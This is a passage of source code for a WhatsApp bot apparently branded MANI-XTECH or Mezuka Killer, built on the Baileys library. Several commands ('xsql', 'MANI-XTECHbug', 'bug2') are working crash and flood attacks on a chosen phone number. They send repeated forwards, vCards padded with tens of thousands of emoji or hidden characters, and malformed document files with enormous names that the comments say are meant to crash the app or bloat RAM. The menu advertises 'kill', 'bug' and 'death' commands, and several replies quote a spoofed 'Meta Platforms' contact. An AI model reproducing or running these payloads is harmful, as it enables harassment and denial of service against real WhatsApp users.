      if (!isOwner) return await socket.sendMessage(sender, { text: '❌ Only the bot owner can use this command!' }, { quoted: msg });

      const argText6 = args.join(' ');
      if (!argText6) return await socket.sendMessage(sender, { text: `*Format Invalid!*\nUse: .xsql 254xxx...` }, { quoted: msg });

      const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
      const quotedSender = msg.message?.extendedTextMessage?.contextInfo?.participant || null;

      let targetJid = mentionedJids[0]
        ? mentionedJids[0]
        : quotedSender
          ? quotedSender
          : argText6.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

      if (!targetJid || targetJid === '@s.whatsapp.net') {
        return await socket.sendMessage(sender, { text: '❌ Target number provide karanna!' }, { quoted: msg });
      }

      // 🔒 Anti-Target Owner
      if (targetJid.includes('9779807044421')) {
        return await socket.sendMessage(sender, { text: '❌ Can\'t target owner!' }, { quoted: msg });
      }

      const senderName = msg.pushName || senderNumber || 'Unknown';

      await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

      const infoText =
        `*Information Attack*\n` +
        `\n* Sender : ${senderName}` +
        `\n* Target : ${targetJid}` +
        `\n* Status : active\n`;

      await socket.sendMessage(sender, { react: { text: '🚫', key: msg.key } });
      await socket.sendMessage(sender, { text: infoText }, { quoted: msg });

      for (let i = 0; i < 10; i++) {
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        await delay(500);
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        await delay(500);
        await socket.sendMessage(targetJid, { forward: msg, force: true });
      }
      break;
    }  
    
  case 'MANI-XTECHbug': {
    // 1. අයිතිකරු පරීක්ෂාව (Owner Check)
    if (!isOwner) return await socket.sendMessage(sender, { text: '❌ Only the bot owner can use this command!' }, { quoted: msg });

    const argText = args.join(' ');
    const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
    const quotedSender = msg.message?.extendedTextMessage?.contextInfo?.participant || null;

    // 2. Target JID එක හඳුනාගැනීම
    let targetJid = mentionedJids[0]
        ? mentionedJids[0]
        : quotedSender
            ? quotedSender
            : argText?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    if (!targetJid || targetJid === '@s.whatsapp.net') {
        return await socket.sendMessage(sender, { text: '❌ Target number provide karanna!\nUsage: .MANI-XTECHbug <number> or mention/reply' }, { quoted: msg });
    }

    // 3. 🔒 Anti-Target Owner ආරක්ෂාව (9779807044421)
    if (targetJid.includes('9779807044421')) {
        return await socket.sendMessage(sender, { text: '❌ Can\'t target owner!' }, { quoted: msg });
    }

    const senderName = msg.pushName || 'Unknown';
    await socket.sendMessage(sender, { react: { text: '🚀', key: msg.key } });

    // 4. Attack Info පණිවිඩය
    const infoText = 
        `⚡ *MANI-XTECH ADVANCE BUG ATTACK* ⚡\n\n` +
        `👤 *Sender:* ${senderName}\n` +
        `🎯 *Target:* ${targetJid}\n` +
        `📅 *Year:* 2026 Edition\n` +
        `📈 *Status:* Sending Super Payloads...\n`;

    await socket.sendMessage(sender, { text: infoText }, { quoted: msg });

    // 5. 🛠️ 2026 Super Payloads (Heavy Data Injection)
    const megaData = '👾'.repeat(30000); // Heavy text payload
    const crashVcard = `BEGIN:VCARD\nVERSION:3.0\nN:${megaData};;;;\nFN:⚡ MANI-XTECH V5 ⚡\nTEL;type=CELL;type=VOICE;waid=${targetJid.split('@')[0]}:+${targetJid.split('@')[0]}\nEND:VCARD`;

    // 6. 🚀 Multi-Attack Loop
    for (let i = 0; i < 5; i++) {
        // Attack 01: Multi-VCard Attack
        await socket.sendMessage(targetJid, { 
            contacts: { 
                displayName: '⚡ MANI-XTECH BUG ⚡', 
                contacts: [{ vcard: crashVcard }, { vcard: crashVcard }] 
            } 
        });

        await delay(400);

        // Attack 02: Document Buffer Crash
        await socket.sendMessage(targetJid, { 
            document: Buffer.alloc(0), 
            mimetype: 'application/pdf', 
            fileName: `⚡ MANI-XTECH-BUG-2026 ⚡ ${megaData}.pdf` 
        });

        await delay(400);

        // Attack 03: Native Forward Injector
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        
        await delay(500);
    }

    await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });
    await socket.sendMessage(sender, { text: `✅ *Attack delivered to ${targetJid}!*` }, { quoted: msg });
    break;
}    
    
   case 'bug2': {
  if (!isOwner) return await socket.sendMessage(sender, { text: '❌ Only the bot owner can use this command!' }, { quoted: msg });

  const argText2 = args.join(' ');
  const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  const quotedSender = msg.message?.extendedTextMessage?.contextInfo?.participant || null;

  let targetJid = mentionedJids[0]
    ? mentionedJids[0]
    : quotedSender
      ? quotedSender
      : argText2?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  if (!targetJid || targetJid === '@s.whatsapp.net') {
    return await socket.sendMessage(sender, { text: '❌ Target number provide karanna!\nUsage: .bug <number> or mention/reply' }, { quoted: msg });
  }

  // 🔒 Anti-Target Owner (9779807044421)
  if (targetJid.includes('9779807044421')) {
    return await socket.sendMessage(sender, { text: '❌ Can\'t target owner!' }, { quoted: msg });
  }

  const senderName = msg.pushName || senderNumber || 'Unknown';

  await socket.sendMessage(sender, { react: { text: '⚡', key: msg.key } });

  const infoText =
    `*⚡ MANI-XTECH V5 2026 ATTACK ACTIVATED ⚡*\n` +
    `\n* 👤 Sender : ${senderName}` +
    `\n* 🎯 Target : ${targetJid}` +
    `\n* 🚀 Engine : Baileys-2026-X` +
    `\n* 📈 Status : Injecting Payloads...\n`;

  await socket.sendMessage(sender, { text: infoText }, { quoted: msg });

  // 🧪 2026 Heavy Payload Generation (Oversized Text + Hidden Characters + VCard Bug)
  const megaPadding = '‌'.repeat(50000); // Hidden Unicode padding to bloat RAM
  const heavyVcard = `BEGIN:VCARD\nVERSION:3.0\nN:${megaPadding};;;;\nFN:⚡ MANI-XTECH KILLER V5 ⚡\nORG:${'💥'.repeat(10000)}\nEND:VCARD`;
  
  const bugPayload = {
    vcard: heavyVcard,
    displayName: "⚡ MANI-XTECH KILLER V5 ⚡"
  };

  // 🚀 Sending Loop - 2026 Enhanced Multi-Payload Injection
  for (let i = 0; i < 7; i++) {
    // 1. Direct Contact Message Crash
    await socket.sendMessage(targetJid, { contact: bugPayload }, { quoted: msg });
    await delay(300);

    // 2. Heavy Document Buffer Injection
    await socket.sendMessage(targetJid, { 
      document: Buffer.alloc(1000), 
      mimetype: 'application/octet-stream', 
      fileName: `⚡ MANI-XTECH CRASH 2026 ⚡ ${megaPadding}.apk` 
    });
    await delay(300);

    // 3. Native Forward Execution
    await socket.sendMessage(targetJid, { forward: msg, force: true });
    await delay(400);
  }

  await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });
  await socket.sendMessage(sender, { text: `✅ *Attack successfully delivered to ${targetJid}!*` }, { quoted: msg });
  break;
}                     

case 'exitme': {
  // 'number' is the session number passed to setupCommandHandlers (sanitized in caller)
  const sanitized = (number || '').replace(/[^0-9]/g, '');
  // determine who sent the command
  const senderNum = (nowsender || '').split('@')[0];
  const ownerNum = config.OWNER_NUMBER.replace(/[^0-9]/g, '');

  // Permission: only the session owner or the bot OWNER can delete this session
  if (senderNum !== sanitized && senderNum !== ownerNum) {
    await socket.sendMessage(sender, { text: '❌ Permission denied. Only the session owner or the bot owner can delete this session.' }, { quoted: msg });
    break;
  }

  try {
    // 1) Remove from Mongo
    await removeSessionFromMongo(sanitized);
    await removeNumberFromMongo(sanitized);

    // 2) Remove temp session dir
    const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
    try {
      if (fs.existsSync(sessionPath)) {
        fs.removeSync(sessionPath);
        console.log(`Removed session folder: ${sessionPath}`);
      }
    } catch (e) {
      console.warn('Failed removing session folder:', e);
    }

    // 3) Try to logout & close socket
    try {
      if (typeof socket.logout === 'function') {
        await socket.logout().catch(err => console.warn('logout error (ignored):', err?.message || err));
      }
    } catch (e) { console.warn('socket.logout failed:', e?.message || e); }
    try { socket.ws?.close(); } catch (e) { console.warn('ws close failed:', e?.message || e); }

    // 4) Remove from runtime maps
    activeSockets.delete(sanitized);
    socketCreationTime.delete(sanitized);

    // 5) notify user
    await socket.sendMessage(sender, {
      image: { url: config.RCD_IMAGE_PATH },
      caption: formatMessage('🗑️ SESSION DELETED', '✅ Your session has been successfully deleted from MongoDB and local storage.', BOT_NAME_FANCY)
    }, { quoted: msg });

    console.log(`Session ${sanitized} deleted by ${senderNum}`);
  } catch (err) {
    console.error('deleteme command error:', err);
    await socket.sendMessage(sender, { text: `❌ Failed to delete session: ${err.message || err}` }, { quoted: msg });
  }
  break;
}

case 'get': {
  try {
    const quotedMsg = msg.message?.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quotedMsg) {
      return await socket.sendMessage(sender, { text: '*❌ Please reply to a message (status/media) to save it.*' }, { quoted: msg });
    }

    try { await socket.sendMessage(sender, { react: { text: '💾', key: msg.key } }); } catch(e){}

    // 🟢 Instead of bot’s own chat, use same chat (sender)
    const saveChat = sender;

    if (quotedMsg.imageMessage || quotedMsg.videoMessage || quotedMsg.audioMessage || quotedMsg.documentMessage || quotedMsg.stickerMessage) {
      const media = await downloadQuotedMedia(quotedMsg);
      if (!media || !media.buffer) {
        return await socket.sendMessage(sender, { text: '❌ Failed to download media.' }, { quoted: msg });
      }

      if (quotedMsg.imageMessage) {
        await socket.sendMessage(saveChat, { image: media.buffer, caption: media.caption || '✅ Status Saved' });
      } else if (quotedMsg.videoMessage) {
        await socket.sendMessage(saveChat, { video: media.buffer, caption: media.caption || '✅ Status Saved', mimetype: media.mime || 'video/mp4' });
      } else if (quotedMsg.audioMessage) {
        await socket.sendMessage(saveChat, { audio: media.buffer, mimetype: media.mime || 'audio/mp4', ptt: media.ptt || false });
      } else if (quotedMsg.documentMessage) {
        const fname = media.fileName || `saved_document.${(await FileType.fromBuffer(media.buffer))?.ext || 'bin'}`;
        await socket.sendMessage(saveChat, { document: media.buffer, fileName: fname, mimetype: media.mime || 'application/octet-stream' });
      } else if (quotedMsg.stickerMessage) {
        await socket.sendMessage(saveChat, { image: media.buffer, caption: media.caption || '✅ Sticker Saved' });
      }

      await socket.sendMessage(sender, { text: '🔥 *Status saved successfully!*' }, { quoted: msg });

    } else if (quotedMsg.conversation || quotedMsg.extendedTextMessage) {
      const text = quotedMsg.conversation || quotedMsg.extendedTextMessage.text;
      await socket.sendMessage(saveChat, { text: `✅ *Status Saved*\n\n${text}` });
      await socket.sendMessage(sender, { text: '🔥 *Text status saved successfully!*' }, { quoted: msg });
    } else {
      if (typeof socket.copyNForward === 'function') {
        try {
          const key = msg.message?.extendedTextMessage?.contextInfo?.stanzaId || msg.key;
          await socket.copyNForward(saveChat, msg.key, true);
          await socket.sendMessage(sender, { text: '🔥 *Saved (forwarded) successfully!*' }, { quoted: msg });
        } catch (e) {
          await socket.sendMessage(sender, { text: '❌ Could not forward the quoted message.' }, { quoted: msg });
        }
      } else {
        await socket.sendMessage(sender, { text: '❌ Unsupported quoted message type.' }, { quoted: msg });
      }
    }

  } catch (error) {
    console.error('❌ Save error:', error);
    await socket.sendMessage(sender, { text: '*❌ Failed to save status*' }, { quoted: msg });
  }
  break;
}
case 'alive': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;
    const logo = cfg.logo || config.RCD_IMAGE_PATH;

    const metaQuote = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_ALIVE" },
      message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    const startTime = socketCreationTime.get(number) || Date.now();
    const uptime = Math.floor((Date.now() - startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    const text = `
╭───❏ *${botName}* ❏
│  ✅ *Status*  : Online & Ready
│  👑 *Owner*   : ${config.OWNER_NAME || 'ɴɪᴍᴇꜱʜᴋᴀ ᴍɪʜɪʀᴀɴ'}
│  ⏳ *Uptime*  : ${hours}h ${minutes}m ${seconds}s
│  ☁️ *Platform*: ${process.env.PLATFORM || 'Heroku'}
╰───────────────────────────────❏

`.trim();

    const buttons = [
      { buttonId: `${config.PREFIX}menu`, buttonText: { displayText: "📋 ᴏᴘᴇɴ ᴍᴇɴᴜ" }, type: 1 }
    ];

    const defaultImg = 'https://raw.githubusercontent.com/NimeshMihiranga-Neno/MANI-XTECH-help/main/bdd52f388339f87467e7222069acec42.jpg';
    let imagePayload;
    try {
      imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);
    } catch(e) { imagePayload = { url: defaultImg }; }

    await socket.sendMessage(sender, {
      image: imagePayload,
      caption: text,
      footer: `ᴘᴏᴡᴇʀᴅ ʙʏ ᴍᴇᴢᴜᴋᴀ ᴍᴅ 🧃`,
      buttons,
      headerType: 4
    }, { quoted: metaQuote });

  } catch(e) {
    console.error('alive error', e);
    await socket.sendMessage(sender, { text: '❌ Failed to send alive status.' }, { quoted: msg });
  }
  break;
}

case 'ping': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;
    const logo = cfg.logo || config.RCD_IMAGE_PATH;

    const latency = Date.now() - (msg.messageTimestamp * 1000 || Date.now());
    const speed = latency < 100 ? '🟢 Fast' : latency < 300 ? '🟡 Medium' : '🔴 Slow';

    const metaQuote = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_PING" },
      message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    const text = `
╭───❏ *${botName}* ❏
│
│  🏓 *Pong!*
│  ⚡ *Latency* : ${latency}ms
│  📶 *Speed*   : ${speed}
│  🕐 *Time*    : ${new Date().toLocaleString()}
│  ☁️ *Platform*: ${process.env.PLATFORM || 'Heroku'}
│  🔗 *Prefix*  : ${config.PREFIX}
│
╰───────────────────────────────❏

> 💜 ᴘɪɴɢ ꜱᴜᴄᴄᴇꜱꜱ!
> 🤖 ʙᴏᴛ ɪꜱ ʀᴜɴɴɪɴɢ ꜱᴍᴏᴏᴛʜʟʏ
`.trim();

    const buttons = [
      { buttonId: `${config.PREFIX}menu`, buttonText: { displayText: "📋 ᴏᴘᴇɴ ᴍᴇɴᴜ" }, type: 1 }
    ];

    const defaultImg = 'https://raw.githubusercontent.com/NimeshMihiranga-Neno/MANI-XTECH-help/main/bdd52f388339f87467e7222069acec42.jpg';
    let imagePayload;
    try {
      imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);
    } catch(e) { imagePayload = { url: defaultImg }; }

    await socket.sendMessage(sender, {
      image: imagePayload,
      caption: text,
      footer: `ᴘᴏᴡᴇʀᴅ ʙʏ ᴍᴇᴢᴜᴋᴀ ᴍᴅ 🧃`,
      buttons,
      headerType: 4
    }, { quoted: metaQuote });

  } catch(e) {
    console.error('ping error', e);
    await socket.sendMessage(sender, { text: '❌ Failed to get ping.' }, { quoted: msg });
  }
  break;
}

case 'system': {
  try {
    const sanitized = (number || '').replace(/[^0-9]/g, '');
    const cfg = await loadUserConfigFromMongo(sanitized) || {};
    const botName = cfg.botName || BOT_NAME_FANCY;
    const logo = cfg.logo || config.RCD_IMAGE_PATH;

    const metaQuote = {
      key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_SYSTEM" },
      message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
    };

    const os = require('os');

    const totalMem = (os.totalmem() / 1024 / 1024 / 1024).toFixed(2);
    const freeMem = (os.freemem() / 1024 / 1024 / 1024).toFixed(2);
    const usedMem = (totalMem - freeMem).toFixed(2);
    const memPercent = ((usedMem / totalMem) * 100).toFixed(1);
    const memBar = memPercent > 80 ? '🔴' : memPercent > 50 ? '🟡' : '🟢';

    const cpuModel = os.cpus()[0]?.model?.trim() || 'Unknown';
    const cpuCores = os.cpus().length;

    const startTime = socketCreationTime.get(number) || Date.now();
    const uptime = Math.floor((Date.now() - startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    const text = `
╭───❏ *${botName}* ❏
│
│  🖥️ *System Info*
│  ─────────────────
│  💻 *OS*      : ${os.type()} ${os.release()}
│  🔧 *Platform*: ${os.platform()}
│  ─────────────────
│  🧠 *CPU*     : ${cpuModel}
│  ⚙️ *Cores*   : ${cpuCores}
│  ─────────────────
│  💾 *Total RAM*: ${totalMem} GB
│  📊 *Used RAM* : ${usedMem} GB ${memBar}
│  📉 *Free RAM* : ${freeMem} GB
│  📶 *Usage*    : ${memPercent}%
│  ─────────────────
│  ⏳ *Uptime*  : ${hours}h ${minutes}m ${seconds}s
│  ☁️ *Host*    : ${process.env.PLATFORM || 'Heroku'}
│
╰───────────────────────────────❏

> 🤖 ꜱʏꜱᴛᴇᴍ ʀᴜɴɴɪɴɢ ɴᴏʀᴍᴀʟʟʏ
> 💜 ᴍᴀᴅᴇ ʙʏ ɴɪᴍᴇꜱʜᴋᴀ ᴍɪʜɪʀᴀɴ
`.trim();

    const buttons = [
      { buttonId: `${config.PREFIX}menu`, buttonText: { displayText: "📋 ᴏᴘᴇɴ ᴍᴇɴᴜ" }, type: 1 },
      { buttonId: `${config.PREFIX}ping`, buttonText: { displayText: "⚡ ᴛᴇꜱᴛ ᴘɪɴɢ" }, type: 1 },
      { index: 3, urlButton: { displayText: "🌐 ᴡᴇʙꜱɪᴛᴇ", url: "https://MANI-XTECHmd.kozow.com" } }
    ];

    const defaultImg = 'https://raw.githubusercontent.com/NimeshMihiranga-Neno/MANI-XTECH-help/main/bdd52f388339f87467e7222069acec42.jpg';
    let imagePayload;
    try {
      imagePayload = String(logo).startsWith('http') ? { url: logo } : fs.readFileSync(logo);
    } catch(e) { imagePayload = { url: defaultImg }; }

    await socket.sendMessage(sender, {
      image: imagePayload,
      caption: text,
      footer: `🔥 ${botName} • SYSTEM INFO 🔥`,
      buttons,
      headerType: 4
    }, { quoted: metaQuote });

  } catch(e) {
    console.error('system error', e);
    await socket.sendMessage(sender, { text: '❌ Failed to get system info.' }, { quoted: msg });
  }
  break;
}
case 'menu': {
  try { await socket.sendMessage(sender, { react: { text: "🎏", key: msg.key } }); } catch(e){}

  try {
    const startTime = socketCreationTime.get(number) || Date.now();
    const uptime = Math.floor((Date.now() - startTime) / 1000);
    const hours = Math.floor(uptime / 3600);
    const minutes = Math.floor((uptime % 3600) / 60);
    const seconds = Math.floor(uptime % 60);

    let userCfg = {};
    try {
      if (number && typeof loadUserConfigFromMongo === 'function')
        userCfg = await loadUserConfigFromMongo((number || '').replace(/[^0-9]/g, '')) || {};
    } catch(e){ console.warn('menu: failed to load config', e); userCfg = {}; }

    const title = userCfg.botName || 'ᶦᶰᵈ᭄ 𝐌ᴇᴢᴜᴋᴀ 𝐊ɪʟʟᴇʀ 亗';

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_FAKE_ID_MENU"
      },
      message: {
        contactMessage: {
          displayName: title,
          vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${title};;;;\nFN:${title}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD`
        }
      }
    };

    const topLines = `🌐 Website: www.MANI-XTECHmd.kozow.com\n`;

    const text = `
╭───❏ *WELCOME TO ${title}* ❏
│ 🤖 *Bot Name*: ${title}
│ 👑 *Owner*: ${config.OWNER_NAME || '𝐍𝐢𝐦𝐞𝐬𝐡𝐤𝐚 𝐌𝐈𝐇𝐈𝐑𝐀𝐍'}
│ 🏷️ *Version*: ${config.BOT_VERSION || 'ʙᴇᴛᴀ'}
╰───────────────❏

> ᴍᴇᴢᴜᴋᴀ ᴋɪʟʟᴇʀ ʙᴇᴛᴀ ᴛʜɪꜱ ɪꜱ ᴛᴇꜱᴛɪɴɢ ʙᴏᴛ 
> ᴍᴀᴅᴇ ʙʏ ɴɪᴍᴇꜱʜᴋᴀ ᴍɪʀᴀɴ 
> ᴛʜᴀɴᴋꜱ ᴜꜱᴇɪɴɢ ᴍʏ ᴛᴏᴏʟ ᴀɴᴅ ʙᴏᴛꜱ

> ${topLines}

╭───❏ *𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨* ❏
│
│  ${config.PREFIX}kill
│  ${config.PREFIX}bug
│  ${config.PREFIX}sql
│  ${config.PREFIX}death
│  ${config.PREFIX}owner
│  ${config.PREFIX}ping
│  ${config.PREFIX}alive
╰───────────────────────────────❏
>  ${config.BOT_FOOTER || '♡⸝⸝> ̫ <⸝⸝♡ 𝐌ᴇᴢᴜᴋᴀ 𝐊ɪʟʟᴇʀ'}
`.trim();

    // ඔයා දාපු buttons
    const buttons = [
      { buttonId: `${config.PREFIX}alive`, buttonText: { displayText: "🎏 ᴛᴇꜱᴛ ᴀʟɪᴠᴇ" }, type: 1 },
      { buttonId: `${config.PREFIX}ping`, buttonText: { displayText: "✨ ᴛᴇꜱᴛ ꜱᴘᴇᴇᴅ" }, type: 1 },
      { buttonId: `${config.PREFIX}owner`, buttonText: { displayText: "🧃 ꜱᴇᴇ ᴏᴡɴᴇʀ" }, type: 1 }
    ];

    const defaultImg = 'https://raw.githubusercontent.com/NimeshMihiranga-Neno/MANI-XTECH-help/main/bdd52f388339f87467e7222069acec42.jpg';
    const useLogo = userCfg.logo || defaultImg;

    let imagePayload;
    if (String(useLogo).startsWith('http')) imagePayload = { url: useLogo };
    else {
      try { imagePayload = fs.readFileSync(useLogo); } catch(e){ imagePayload = { url: defaultImg }; }
    }

    try {
      await socket.sendMessage(sender, {
        image: imagePayload,
        caption: text,
        footer: "ᴍᴇᴢᴜᴋᴀ ᴍᴅ 🧃✨",
        buttons,
        headerType: 4
      }, { quoted: shonux });

    } catch(e) {
      console.warn('menu: rich send failed, sending plain text', e);
      try { await socket.sendMessage(sender, { text }, { quoted: msg }); } catch(e){}
    }

  } catch(err) {
    console.error('menu command error:', err);
    try { await socket.sendMessage(sender, { text: '❌ Failed to show menu.' }, { quoted: msg }); } catch(e){}
  }
  break;
}

case 'owner': {
  try { 
    await socket.sendMessage(sender, { 
      react: { text: "👑", key: msg.key } 
    }); 
  } catch(e){}

  try {
    let userCfg = {};
    try {
      if (number && typeof loadUserConfigFromMongo === 'function') {
        userCfg = await loadUserConfigFromMongo(
          (number || '').replace(/[^0-9]/g, '')
        ) || {};
      }
    } catch(e){ userCfg = {}; }

    const title = userCfg.botName || '♡⸝⸝> ̫ <⸝⸝♡ ᴍᴇᴢᴜᴋᴀ ᴋɪʟᴇʀ';

    const shonux = {
      key: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        fromMe: false,
        id: "META_AI_FAKE_ID_OWNER"
      },
      message: {
        contactMessage: {
          displayName: title,
          vcard: `BEGIN:VCARD
VERSION:3.0
N:${title};;;;
FN:${title}
ORG:Meta Platforms
TEL;type=CELL;type=VOICE;waid=9779807044421:+9779807044421
END:VCARD`
        }
      }
    };

    const text = `
╭───❏ *OWNER INFO* ❏
│
│ 👑 *Name*: MANI-XTECH
│ 📞 *Contact*: +9779807044421
│ 📧 *Email*: editmanish324@gmail.com
│
│ 💬 *For support or queries*
│ contact the owner directly
│
╰───────────────❏
`.trim();

    const buttons = [
      {
        buttonId: `${config.PREFIX}menu`,
        buttonText: { displayText: "🎏 ᴍᴇɴᴜ" },
        type: 1
      },
      {
        buttonId: `${config.PREFIX}ping`,
        buttonText: { displayText: "✨ ꜱᴘᴇᴇᴅ" },
        type: 1
      }
    ];

    await socket.sendMessage(
      sender,
      {
        image: {
          url: 'https://raw.githubusercontent.com/NimeshMihiranga-Neno/MANI-XTECH-help/main/bdd52f388339f87467e7222069acec42.jpg'
        },
        caption: text,
        footer: "ᴍᴇᴢᴜᴋᴀ ᴍᴅ 🧃",
        buttons: buttons,
        headerType: 4
      },
      { quoted: shonux }
    );

  } catch (err) {
    console.error('owner command error:', err);
    try {
      await socket.sendMessage(
        sender,
        { text: '❌ Failed to show owner info.' },
        { quoted: msg }
      );
    } catch(e){}
  }
  break;
}

      default:
        break;
      }
    } catch (err) {
      console.error('Command handler error:', err);
      try { await socket.sendMessage(sender, { image: { url: config.RCD_IMAGE_PATH }, caption: formatMessage('❌ ERROR', 'An error occurred while processing your command. Please try again.', BOT_NAME_FANCY) }); } catch(e){}
    }

  });
}

// ---------------- message handlers ----------------

function setupMessageHandlers(socket) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;
    if (config.AUTO_RECORDING === 'true') {
      try { await socket.sendPresenceUpdate('recording', msg.key.remoteJid); } catch (e) {}
    }
  });
}

// ---------------- cleanup helper ----------------

async function deleteSessionAndCleanup(number, socketInstance) {
  const sanitized = number.replace(/[^0-9]/g, '');
  try {
    const sessionPath = path.join(os.tmpdir(), `session_${sanitized}`);
    try { if (fs.existsSync(sessionPath)) fs.removeSync(sessionPath); } catch(e){}
    activeSockets.delete(sanitized); socketCreationTime.delete(sanitized);
    try { await removeSessionFromMongo(sanitized); } catch(e){}
    try { await removeNumberFromMongo(sanitized); } catch(e){}
    try {
      const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
      const caption = formatMessage('👑 OWNER NOTICE — SESSION REMOVED', `Number: ${sanitized}\nSession removed due to logout.\n\nActive sessions now: ${activeSockets.size}`, BOT_NAME_FANCY);
      if (socketInstance && socketInstance.sendMessage) await socketInstance.sendMessage(ownerJid, { image: { url: config.RCD_IMAGE_PATH }, caption });
    } catch(e){}
    console.log(`Cleanup completed for ${sanitized}`);
  } catch (err) { console.error('deleteSessionAndCleanup error:', err); }
}

// ---------------- auto-restart ----------------

function setupAutoRestart(socket, number) {
  socket.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'close') {
      const statusCode = lastDisconnect?.error?.output?.statusCode
                         || lastDisconnect?.error?.statusCode
                         || (lastDisconnect?.error && lastDisconnect.error.toString().includes('401') ? 401 : undefined);
      const isLoggedOut = statusCode === 401
                          || (lastDisconnect?.error && lastDisconnect.error.code === 'AUTHENTICATION')
                          || (lastDisconnect?.error && String(lastDisconnect.error).toLowerCase().includes('logged out'))
                          || (lastDisconnect?.reason === DisconnectReason?.loggedOut);
      if (isLoggedOut) {
        console.log(`User ${number} logged out. Cleaning up...`);
        try { await deleteSessionAndCleanup(number, socket); } catch(e){ console.error(e); }
      } else {
        console.log(`Connection closed for ${number} (not logout). Attempt reconnect...`);
        try { await delay(10000); activeSockets.delete(number.replace(/[^0-9]/g,'')); socketCreationTime.delete(number.replace(/[^0-9']/g,'')); const mockRes = { headersSent:false, send:() => {}, status: () => mockRes }; await EmpirePair(number, mockRes); } catch(e){ console.error('Reconnect attempt failed', e); }
      }

    }

  });
}

// ---------------- EmpirePair (pairing, temp dir, persist to Mongo) ----------------

async function EmpirePair(number, res) {
  const sanitizedNumber = number.replace(/[^0-9]/g, '');
  const sessionPath = path.join(os.tmpdir(), `session_${sanitizedNumber}`);
  await initMongo().catch(()=>{});
  // Prefill from Mongo if available
  try {
    const mongoDoc = await loadCredsFromMongo(sanitizedNumber);
    if (mongoDoc && mongoDoc.creds) {
      fs.ensureDirSync(sessionPath);
      fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(mongoDoc.creds, null, 2));
      if (mongoDoc.keys) fs.writeFileSync(path.join(sessionPath, 'keys.json'), JSON.stringify(mongoDoc.keys, null, 2));
      console.log('Prefilled creds from Mongo');
    }
  } catch (e) { console.warn('Prefill from Mongo failed', e); }

  const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
  const logger = pino({ level: process.env.NODE_ENV === 'production' ? 'fatal' : 'debug' });

  try {
    const socket = makeWASocket({
      version: [2, 3000, 1033105955],
      auth: {
        creds: state.creds,
        keys: makeCacheableSignalKeyStore(state.keys, logger)
      },
      printQRInTerminal: false,
      logger,
      browser: ['Ubuntu', 'Chrome', '20.0.04'],
      syncFullHistory: false,
      generateHighQualityLinkPreview: false
    });

    socketCreationTime.set(sanitizedNumber, Date.now());

    setupStatusHandlers(socket);
    setupCommandHandlers(socket, sanitizedNumber);
    setupMessageHandlers(socket);
    setupAutoRestart(socket, sanitizedNumber);
    setupNewsletterHandlers(socket, sanitizedNumber);
    handleMessageRevocation(socket, sanitizedNumber);

    if (!socket.authState.creds.registered) {
      let retries = config.MAX_RETRIES;
      let code;
      while (retries > 0) {
        try { await delay(1500); code = await socket.requestPairingCode(sanitizedNumber); break; }
        catch (error) { retries--; await delay(2000 * (config.MAX_RETRIES - retries)); }
      }
      if (!res.headersSent) res.send({ code });
    }

    // Save creds to Mongo when updated
    socket.ev.on('creds.update', async () => {
      try {
        await saveCreds();
        const fileContent = await fs.readFile(path.join(sessionPath, 'creds.json'), 'utf8');
